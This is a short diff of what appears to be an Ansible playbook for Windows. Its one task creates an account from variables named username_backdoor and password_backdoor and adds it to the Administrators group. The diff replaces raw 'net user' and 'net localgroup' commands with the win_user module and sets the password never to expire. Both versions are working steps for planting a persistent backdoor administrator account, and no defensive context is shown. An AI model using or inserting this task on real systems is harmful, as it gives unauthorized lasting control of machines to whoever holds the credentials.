@@ -26,7 +26,11 @@
    - /opt/ansible/vars.yaml
   tasks:
         - name: Create a new system account
-          win_command: |
-            net user {{ username_backdoor }} {{ password_backdoor }} /add
-            net localgroup "Administrators" {{ username_backdoor }} /add
+          win_user:
+           name: '{{ username_backdoor }}'
+           password: '{{ password_backdoor }}'
+           groups: Administrators
+           update_password: no
+           password_never_expired: yes
+
 
